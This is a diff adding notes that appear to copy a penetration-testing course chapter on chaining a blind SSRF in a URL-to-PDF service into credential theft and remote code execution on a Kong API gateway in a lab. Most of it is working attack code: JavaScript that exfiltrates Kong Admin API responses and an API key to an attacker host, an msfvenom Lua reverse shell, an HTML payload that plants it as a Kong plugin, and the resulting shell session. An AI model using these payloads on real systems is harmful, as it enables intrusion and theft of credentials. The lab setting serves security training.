@@ -1029,4 +1029,447 @@ The Render service returns its results to the File service. The File service ret
 Exercise
 Repeat the steps above and execute JavaScript in the Headless Chrome browser.
 
+##### Using JavaScript to Exfiltrate Data
+Our next goal is to use JavaScript to exfiltrate data, essentially turning our blind SSRF into a normal SSRF. We'll attempt to use JavaScript to call the Kong Admin API from inside the network. Remember, such an HTTP request would originate from the host running the Headless Chrome browser. The containers seem to have network connections that allow internal communication between themselves on ports that are not exposed externally as evidenced by the SSRF being able to access port 8001 on (what we perceive to be) the Kong API Gateway host. We can reasonably assume the Headless Chrome browser will also be able to access the same port as well.
+
+The default behavior of a user-defined bridge network in Docker is for containers to expose all ports to each other.1 This description seems to match the environment we are operating in. A port needs to be explicitly published to be accessible from outside the network. This would explain why we can access port 8000 on the Kong API Gateway container from Kali (it is published) and why the Render Service can access port 8001 on the Kong API Gateway container (it is not published but exposed internally by the network).
+
+Let's create a new HTML page with a JavaScript function. First, the function will make a request to the Kong Admin API. If CORS is enabled and permissive enough on the Admin API, our JavaScript function will be able to access the response body and send it back to the web server running on our Kali host. If this doesn't work, we will have to consult the documentation for the Kong Admin API and determine what we can do without CORS.
+
+function exfiltrate() {
+    fetch("http://172.16.16.2:8001")
+    .then((response) => response.text())
+    .then((data) => {
+        fetch("http://192.168.118.3/callback?" + encodeURIComponent(data));
+    }).catch(err => {
+        fetch("http://192.168.118.3/error?" + encodeURIComponent(err));
+    }); 
+}
+Listing 46 - Sample JavaScript function to exfiltrate data
+
+After placing the JavaScript function in an HTML file in our webroot, we will again call the Render API on the new HTML page.
+
+kali@kali:~$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/api/render?url=http://192.168.118.3/exfil.html"}' http://apigateway:8000/files/import 
+{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}
+Listing 47 - Calling the Render API on exfil.html
+
+When we check access.log, we should have the callback message.
+
+kali@kali:~$ sudo tail /var/log/apache2/access.log 
+...
+192.168.120.135 - - [25/Feb/2021:13:18:47 -0500] "GET /exfil.html HTTP/1.1" 200 562 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
+192.168.120.135 - - [25/Feb/2021:13:18:47 -0500] "GET /callback?%7B%22plugins%22%3A%7B%22enabled_in_cluster%22%3A%5B%22key-auth%22%5D%2C%22available_on_server%22%3A%7B%22grpc-web%22%3Atrue%2C%22correlation-id%22%3Atrue%2C%22...042%2C%22mem_cache_size%22%3A%22128m%22%2C%22pg_max_concurrent_queries%22%3A0%2C%22nginx_main_worker_p" 414 0 "-" "-"
+Listing 48 - Excerpt from access.log
+
+Excellent. Our JavaScript function sent a request to the internal endpoint, then sent that response as a URL-encoded value back to our Kali host. The message might have been truncated, but our JavaScript function worked.
+
+Exercise
+Repeat the steps above.
+
+Extra Mile
+Modify the JavaScript function to avoid data truncation by sending the data in multiple requests if the data is longer than 1024 characters.
+
+1
+(Docker Inc, 2021), https://docs.docker.com/network/bridge/#differences-between-user-defined-bridges-and-the-default-bridge ↩︎
+
+
+Exfil.html (served from kali):
+```
+<html>
+<head>
+<script>
+function exfiltrate() {
+    fetch("http://172.16.16.2:8001/key-auths")
+    .then((response) => response.text())
+    .then((data) => {
+	chunks = data.match( new RegExp('.{1,1024}','g'));    
+	for (i=0; i < chunks.length; i++) {
+            fetch("http://192.168.45.204/callback?chunks=" + i + "&data=" + encodeURIComponent(chunks[i]));
+	}
+    }).catch(err => {
+        fetch("http://192.168.45.204/error?" + encodeURIComponent(err));
+    });
+}
+</script>
+</head>
+<body onload='exfiltrate()'>
+<div></div>
+</body>
+</html>
+```
+command used for exfil:
+```
+curl -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.6:9000/api/render?url=http://192.168.45.204/exfil.html"}' http://apigateway:8000/files/import
+
+```
+
+##### Stealing Credentials from Kong Admin API
+Next, we'll turn our focus to stealing credentials from the Kong Admin API with our JavaScript payload. As a reminder, when we first called the /render endpoint through the Kong API Gateway, it responded with "No API key found in request". Let's try to find that API key in Kong's Admin API.
+
+We can find the Admin API endpoint that returns API keys in Kong's documentation.1 Let's update our JavaScript function to call /key-auths, call the Render service, and then check access.log.
+
+kali@kali:~$ sudo tail /var/log/apache2/access.log
+...
+192.168.120.135 - - [25/Feb/2021:13:34:24 -0500] "GET /exfil.html HTTP/1.1" 200 569 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
+192.168.120.135 - - [25/Feb/2021:13:34:24 -0500] "GET /callback?%7B%22next%22%3Anull%2C%22data%22%3A%5B%7B%22created_at%22%3A1613767827%2C%22id%22%3A%22c34c38b6-4589-4a1e-a8f7-d2277f9fe405%22%2C%22tags%22%3Anull%2C%22ttl%22%3Anull%2C%22key%22%3A%22SBzrCb94o9JOWALBvDAZLnHo3s90smjC%22%2C%22consumer%22%3A%7B%22id%22%3A%22a8c78b54-1d08-43f8-acd2-fb2c7be9e893%22%7D%7D%5D%7D HTTP/1.1" 404 491 "http://192.168.118.3/exfil.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
+Listing 49 - JavaScript callback in access.log
+
+After decoding the data, we find the API key.
+
+{"next":null,"data":[{
+  "created_at":1613767827,
+  "id":"c34c38b6-4589-4a1e-a8f7-d2277f9fe405",
+  "tags":null,
+  "ttl":null,
+  "key":"SBzrCb94o9JOWALBvDAZLnHo3s90smjC",
+  "consumer":{"id":"a8c78b54-1d08-43f8-acd2-fb2c7be9e893"}}]}
+Listing 50 - Decoded data
+
+Excellent. Now that we have the API key, we should be able to call the render endpoint through the API gateway without needing the SSRF vulnerability.
+
+Exercises
+Recreate the steps above to gain access to the API key.
+Without calling the File Import service, recreate the attack to steal credentials from Kong by calling the Render service directly with the API key.
+Adjust your HTML payload so the credentials are included in the PDF the service returns.
+Extra Mile
+Create a web server in your choice of programming language to handle the JavaScript callbacks and automatically URL-decode the data.
+
+1
+(Kong Inc, 2021), https://docs.konghq.com/hub/kong-inc/key-auth/#paginate-through-keys ↩︎
+
+Getting api-key by supplying apikey but calling /render directly. API ket is from Kong's admin :
+```
+curl "http://apigateway:8000/render?url=http://192.168.45.204/exfil.html&apikey=SBzrCb94o9JOWALBvDAZLnHo3s90smjC"
+```
+pdf contains api-key:
+```
+curl -v "http://apigateway:8000/render?url=http://172.16.16.2:8001/key-auths&apikey=SBzrCb94o9JOWALBvDAZLnHo3s90smjC" --output y.pdf
+```
+
+##### URL to PDF Microservice Source Code Analysis
+The Render Service is an open-source URL to PDF microservice.1 The application's documentation includes a warning about the risks of running this application publicly. This application was included in the lab environment and required authentication at the API gateway to simulate some commonly-encountered microservice environments.
+
+We have already exploited the headless browser this application uses. We will quickly review the application's source code to increase our familiarity with NodeJS and determine what security controls are in place.
+
+The source code referenced in this section is also available on the Wiki VM.
+
+In fact, the application includes some validation on the initial request. Let's review the application's router configuration found in /src/router.js. The relevant code is available on GitHub.2 We will start at the beginning of the file to review what dependencies it imports.
+
+01  const _ = require('lodash');
+02  const validate = require('express-validation');
+03  const express = require('express');
+04  const render = require('./http/render-http');
+05  const config = require('./config');
+06  const logger = require('./util/logger')(__filename);
+07  const { renderQuerySchema, renderBodySchema, sharedQuerySchema } = require('./util/validation');
+Listing 51 - imports
+
+The application imports the express3 framework (line 2) and the middleware express-validator4 for validation (line 3). It also imports three custom validation objects on line 7. These objects will become important later on.
+
+Next, we'll review the code that defines the route for GET requests to /api/render. The relevant code starts on line 29.
+
+29  const getRenderSchema = {
+30    query: renderQuerySchema,
+31    options: {
+32      allowUnknownBody: false,
+33      allowUnknownQuery: false,
+34    },
+35  };
+36  router.get('/api/render', validate(getRenderSchema), render.getRender);
+Listing 52 - Router and getRenderSchema definitions
+
+Line 36 defines the router for GET requests to /api/render. The first parameter to the router.get() function is the URI path. The middle parameter is a validation function that receives the getRenderSchema object. The application calls the validation function before calling the handler function (set by the last parameter, or render.getRender).
+
+Let's review the definition of the renderQuerySchema object which is available in /src/util/validation.js.5
+
+68  const renderQuerySchema = Joi.object({
+69    url: urlSchema.required(),
+70  }).concat(sharedQuerySchema);
+Listing 53 - renderQuerySchema definition
+
+The renderQuerySchema definition is a Joi6 object. Joi is a schema definition and data validation library for NodeJS. The code defines a url parameter on line 69 with a value of urlSchema.required(). After the Joi object is created, the code concatenates the sharedQuerySchema object to it. This object contains additional schema definitions but isn't important to our analysis. However, the urlSchema object is important. We can find its definition starting on line 3.
+
+03  const urlSchema = Joi.string().uri({
+04    scheme: [
+05      'http',
+06      'https',
+07    ],
+08  });
+Listing 54 - urlSchema definition
+
+On line 3, urlSchema is set to a Joi.string().uri.7 This requires a string value to be a valid URL. The scheme parameter adds further restrictions to only allow HTTP or HTTPS protocols on the URL. These settings should prevent the application from processing a URL with the FILE protocol.
+
+We can verify this control by calling the service directly through the API gateway and submitting the file:///etc/passwd value in the url parameter.
+
+kali@kali:~$ curl "http://apigateway:8000/render?url=file:///etc/passwd&apikey=SBzrCb94o9JOWALBvDAZLnHo3s90smjC"
+{"status":400,"statusText":"Bad Request","errors":[{"field":["url"],"location":"query","messages":["\"url\" must be a valid uri with a scheme matching the http|https pattern"],"types":["string.uriCustomScheme"]}]}
+Listing 55 - Error message for the FILE protocol
+
+Instead of the file contents, we received an error that our url parameter isn't valid. Additionally, Chrome itself will block a resource loaded over HTTP or HTTPS from accessing another resource with the FILE protocol.
+
+Now that we understand what validation is in place, let's continue our analysis of how the application renders the URL we submit. According to Listing 52, render.getRender is the request handler function.
+
+This function is defined in /src/http/render-http.js.8
+
+01  const { URL } = require('url');
+02  const _ = require('lodash');
+03  const normalizeUrl = require('normalize-url');
+04  const ex = require('../util/express');
+05  const renderCore = require('../core/render-core');
+06  const logger = require('../util/logger')(__filename);
+07  const config = require('../config');
+...
+24  const getRender = ex.createRoute((req, res) => {
+25    const opts = getOptsFromQuery(req.query);
+26  
+27    assertOptionsAllowed(opts);
+28    return renderCore.render(opts)
+29      .then((data) => {
+30        if (opts.attachmentName) {
+31          res.attachment(opts.attachmentName);
+32      }
+33      res.set('content-type', getMimeType(opts));
+34      res.send(data);
+35    });
+36  });
+Listing 56 - render-http.getRender function
+
+The getRender function performs some additional validation by calling assertOptionsAllowed. We will not review this function in detail here. Our main interest is the renderCore.render function called on line 28. The application will return the results of that function as an attachment in the eventual server response (lines 31 - 34).
+
+This function is defined in /src/core/render-core.js.9
+
+Let's start with the imports.
+
+01  const puppeteer = require('puppeteer');
+02  const _ = require('lodash');
+03  const config = require('../config');
+04  const logger = require('../util/logger')(__filename);
+Listing 57 - Import statements for render-core.js
+
+We can tell from the import statement on line 1 that this application uses puppeteer,10 a Node library for programmatically managing Chrome or Chromium. The render function starts on line 41. We will focus on the highlights instead of reviewing every line of code in the function.
+
+041  async function render(_opts = {}) {
+042    const opts = _.merge({
+...  
+065    }, _opts);
+...
+075    const browser = await createBrowser(opts);
+076    const page = await browser.newPage();
+...
+106    try {
+107      logger.info('Set browser viewport..');
+108      await page.setViewport(opts.viewport);
+109      if (opts.emulateScreenMedia) {
+110        logger.info('Emulate @media screen..');
+111        await page.emulateMedia('screen');
+112      }
+...
+123      if (_.isString(opts.html)) {
+124        logger.info('Set HTML ..');
+125        await page.setContent(opts.html, opts.goto);
+126      } else {
+127        logger.info(`Goto url ${opts.url} ..`);
+128        await page.goto(opts.url, opts.goto);
+129      }
+...
+Listing 58 - renderCore.render function
+
+The function declares a browser object on line 75. The createBrowser function, which creates a new browser process using puppeteer, sets the value of the object. On line 76, a new page is created. A page in this context can be thought of as single tab in the browser. The code then defines several response handlers, which we have omitted. Finally, on line 123, the function checks if HTML was submitted as part of the request. If not, the function loads the submitted URL in the browser.
+
+There is more code in this function to handle scrolling through the page and other user-defined options but we have covered the main points. Let's review the end of the function.
+
+170      if (opts.output === 'pdf') {
+171        if (opts.pdf.fullPage) {
+172          const height = await getFullPageHeight(page);
+173          opts.pdf.height = height;
+174        }
+175        data = await page.pdf(opts.pdf);
+176      } else if (opts.output === 'html') {
+177        data = await page.evaluate(() => document.documentElement.innerHTML);
+178      } else {
+...
+206    return data;
+207  }
+Listing 59 - returning data
+
+If the requested output is a PDF, the function calls the page.pdf function and sets the results in the data variable. Otherwise, if the requested output format is HTML, the function instead calls page.evaluate, which returns the loaded page's innerHtml element.
+
+As we discovered in Listing 56, the application returns the value of data as an attachment on the server response.
+
+While we have not found a way to leverage Headless Chrome and the URL to PDF microservice to access local files on the server, we do have the full range of executing JavaScript from the headless browser. This will prove to be very useful as we pivot to remote code execution.
+
+1
+(Alvar Carto, 2021), https://github.com/alvarcarto/url-to-pdf-api ↩︎
+
+2
+(GitHub, 2021), https://github.com/alvarcarto/url-to-pdf-api/blob/master/src/router.js ↩︎
+
+3
+(StrongLoop and IBM, 2017)http://expressjs.com/ ↩︎
+
+4
+(express-validator, 2021), https://express-validator.github.io/docs/ ↩︎
+
+5
+(GitHub, 2021), https://github.com/alvarcarto/url-to-pdf-api/blob/master/src/util/validation.js ↩︎
+
+6
+(Sidway Inc, 2021), https://joi.dev/ ↩︎
+
+7
+(Sidway Inc, 2021), https://joi.dev/api/?v=17.4.0#stringurioptions ↩︎
+
+8
+(GitHub, 2021), https://github.com/alvarcarto/url-to-pdf-api/blob/master/src/http/render-http.js ↩︎
+
+9
+(GitHub, 2021), https://github.com/alvarcarto/url-to-pdf-api/blob/master/src/core/render-core.js ↩︎
+
+10
+(Google, 2021), https://github.com/puppeteer/puppeteer#readme ↩︎
+
+##### Remote Code Execution
+Exfiltrating data is a nice accomplishment, but let's try to achieve remote code execution. We'll begin by reviewing our potential targets.
+
+Figure 6: Network diagram
+Figure 6: Network diagram
+Since we can execute arbitrary JavaScript via the Render service, we can send requests to any of the hosts in the internal network. The PostgreSQL database will be difficult to attack without credentials. The REDIS server seems enticing, but let's focus on the Kong API Gateway since we already know we can access it via the Render service headless browser.
+
+9.7.1. RCE in Kong Admin API
+After spending some time reviewing documentation for Kong API Gateway, the plugins seemed like a good area to focus on. We can't install a custom plugin without the ability to restart Kong so we need to use the plugins already included.
+
+The Serverless Functions1 plugin has an interesting warning in its documentation:
+
+Warning: The pre-function and post-function serverless plugin allows anyone who can enable the plugin to execute arbitrary code. If your organization has security concerns about this, disable the plugin in your kong.conf file.
+
+That sounds perfect for our purposes! Let's check if Kong has that plugin loaded. Our first call to the Kong API Gateway Admin API actually contained information about what plugins are enabled on the server.
+
+{"plugins":{"enabled_in_cluster":["key-auth"],"available_on_server":{"grpc-web":true,"correlation-id":true,"pre-function":true,"cors":true,...
+Listing 60 - Excerpt of enabled plugins
+
+Since the pre-function plugin is enabled, let's try to exploit that. The plugin runs Lua code so we'll need to build a matching payload. We can use msfvenom to generate a reverse shell payload.
+
+kali@kali:~$ msfvenom -p cmd/unix/reverse_lua lhost=192.168.118.3 lport=8888 -f raw -o shell.lua
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 223 bytes
+Saved as: shell.lua
+
+kali@kali:~$ cat shell.lua
+lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('192.168.118.3',8888);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"
+Listing 61 - Generating a Lua reverse shell
+
+Since we will be uploading a Lua file, we won't need "lua -e" in the final version of the payload.
+
+According to the Kong documentation, we have to add a plugin to a Service. We could add the plugin to an existing Service, but let's limit the exposure of it by creating a new Service. A Service needs a Route for us to call it. Let's create a new HTML page with a JavaScript function that creates a Service, adds a Route to the Service, then adds our Lua code as a "pre-function" plugin to the Service.
+
+Any time we add users or modify applications during a security engagement, we should keep track of the changes and undo them at the end of the engagement. We never want to leave an application less secure than we found it.
+
+We can use our previous JavaScript function as a starting point for the new one.
+
+<html>
+<head>
+<script>
+
+function createService() {
+    fetch("http://172.16.16.2:8001/services", {
+      method: "post",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({"name":"supersecret", "url": "http://127.0.0.1/"})
+    }).then(function (route) {
+      createRoute();
+    });
+}
+
+function createRoute() {
+    fetch("http://172.16.16.2:8001/services/supersecret/routes", { 
+      method: "post",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({"paths": ["/supersecret"]})
+    }).then(function (plugin) {
+      createPlugin();
+    });  
+}
+
+function createPlugin() {
+    fetch("http://172.16.16.2:8001/services/supersecret/plugins", { 
+      method: "post",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({"name":"pre-function", "config" :{ "access" :[  REVERSE SHELL HERE ]}})
+    }).then(function (callback) {
+      fetch("http://192.168.118.3/callback?setupComplete");
+    });  
+}
+</script>
+</head>
+<body onload='createService()'>
+<div></div>
+</body>
+</html>
+Listing 62 - Contents of rce.html
+
+In the code listing above, we use three sections to clarify the code and simplify updates. The page's onload event calls the createService() function, which sends a POST request to create a new service named "supersecret". The function then calls createRoute(). This function adds the /supersecret route to the new service. It then calls createPlugin(), which adds our Lua payload as a plugin on the service. Finally, it makes a GET request to our Kali host.
+
+To make debugging our attack easier, we could use fetch() to send the response of each call to Kong back to our Kali host.
+
+Once this page is in our webroot, we can use curl to send it to the Render service.
+
+kali@kali:~$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/api/render?url=http://192.168.118.3/rce.html"}' http://apigateway:8000/files/import
+
+{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}
+Listing 63 - Delivering the RCE payload
+
+If everything worked, we should have a "setupComplete" entry in our access.log file.
+
+kali@kali:~$ sudo tail /var/log/apache2/access.log
+...
+192.168.120.135 - - [25/Feb/2021:13:46:16 -0500] "GET /rce.html HTTP/1.1" 200 872 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
+192.168.120.135 - - [25/Feb/2021:13:46:16 -0500] "GET /callback?setupComplete HTTP/1.1" 404 491 "http://192.168.118.3/rce.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
+Listing 64 - Checking for setupComplete callback
+
+It seems like our payload worked. We will need to set up a Netcat listener and then trigger our Lua payload by accessing the new service endpoint.
+
+kali@kali:~$ curl -i  http://apigateway:8000/supersecret
+Listing 65 - Sending a request to the endpoint configured with our reverse shell plugin
+
+The request will hang, but if we check our Netcat listener, we should have a shell.
+
+kali@kali:~$ nc -nvlp 8888
+listening on [any] 8888 ...
+connect to [192.168.118.3] from (UNKNOWN) [192.168.120.135] 41764
+
+whoami
+kong
+
+ls -al
+total 72
+drwxr-xr-x    1 root     root          4096 Feb 19 20:49 .
+drwxr-xr-x    1 root     root          4096 Feb 19 20:49 ..
+-rwxr-xr-x    1 root     root             0 Feb 19 20:49 .dockerenv
+drwxr-xr-x    1 root     root          4096 Dec 17 14:57 bin
+drwxr-xr-x    5 root     root           340 Feb 25 14:38 dev
+-rwxrwxr-x    1 root     root          1236 Dec 17 14:57 docker-entrypoint.sh
+drwxr-xr-x    1 root     root          4096 Feb 19 20:49 etc
+drwxr-xr-x    1 root     root          4096 Dec 17 14:57 home
+...
+Listing 66 - Reverse shell from the Kong API Gateway server
+
+Our payload worked and we now have a reverse shell on the Kong API Gateway server. The presence of .dockerenv and docker-entrypoint.sh confirm our earlier suspicion that the servers were actually containers.
+
+Exercise
+Finish the JavaScript payload and get your shell.
+
+Extra Mile
+The current reverse shell isn't fully interactive and can cause the gateway to hang. Upgrade to a fully interactive shell.
+
+With the other plugins available in Kong API Gateway, find a way to log all traffic passing through the gateway. Inspect the traffic for any sensitive data. You should only need five to ten minutes worth of logging. The logging plugin can be disabled by sending a GET request to /plugins to get the plugin's id, then sending a DELETE request to /plugins/{id}. Review the authentication documentation for Directus2 and use the logged data to gain access to a valid access token for Directus.
+
+1
+(Kong Inc, 2021), https://docs.konghq.com/hub/kong-inc/serverless-functions/ ↩︎
+
+2
+(Monospace Inc, 2020), https://docs.directus.io ↩︎
+
+
 
